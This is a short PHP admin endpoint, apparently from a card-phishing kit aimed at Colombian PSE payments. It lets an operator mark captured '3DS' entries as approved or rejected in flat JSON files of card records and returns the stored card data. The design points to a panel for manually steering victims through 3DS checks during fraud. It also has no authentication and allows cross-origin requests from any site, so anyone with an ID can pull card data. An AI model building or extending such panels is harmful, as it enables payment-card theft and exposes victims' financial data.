<?php
// admin/aprobar_3ds.php - Aprueba o rechaza 3DS desde el panel
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

$dataDir = __DIR__ . '/data';
$tarjetasFile = $dataDir . '/tarjetas.json';
$logsFile = $dataDir . '/pse_logs.json';

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

$id_3ds = $input['id_3ds'] ?? '';
$accion = $input['accion'] ?? '';

if (empty($id_3ds) || empty($accion)) {
    echo json_encode(['success' => false, 'error' => 'Faltan parámetros']);
    exit;
}

$nuevoEstado = $accion === 'aprobar' ? 'aprobado' : ($accion === 'rechazar' ? 'rechazado' : 'pendiente');
$encontrado = false;
$datosTarjeta = null;

// ====== ACTUALIZAR TARJETAS.JSON ======
if (file_exists($tarjetasFile)) {
    $content = file_get_contents($tarjetasFile);
    $tarjetas = json_decode($content, true) ?? [];
    
    foreach ($tarjetas as &$t) {
        if ($t['id_3ds'] === $id_3ds) {
            $encontrado = true;
            $t['estado_3ds'] = $nuevoEstado;
            $t['fecha_3ds'] = date('Y-m-d H:i:s');
            $datosTarjeta = $t;
            break;
        }
    }
    unset($t);
    
    if ($encontrado) {
        file_put_contents($tarjetasFile, json_encode($tarjetas, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }
}

// ====== ACTUALIZAR PSE_LOGS.JSON ======
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
    
    foreach ($logs as &$log) {
        if (isset($log['id_3ds']) && $log['id_3ds'] === $id_3ds) {
            $encontrado = true;
            $log['estado_3ds'] = $nuevoEstado;
            $log['estado'] = $nuevoEstado;
            $log['fecha_3ds'] = date('Y-m-d H:i:s');
            if (!$datosTarjeta) {
                $datosTarjeta = $log;
            }
            break;
        }
    }
    unset($log);
    
    if ($encontrado) {
        file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }
}

// ====== RESPONDER ======
if (!$encontrado) {
    echo json_encode(['success' => false, 'error' => 'ID 3DS no encontrado']);
    exit;
}

$mensaje = $accion === 'aprobar' ? '✅ 3DS aprobado correctamente' : '❌ 3DS rechazado';
echo json_encode([
    'success' => true,
    'id_3ds' => $id_3ds,
    'estado' => $nuevoEstado,
    'message' => $mensaje,
    'datos' => $datosTarjeta
]);
?>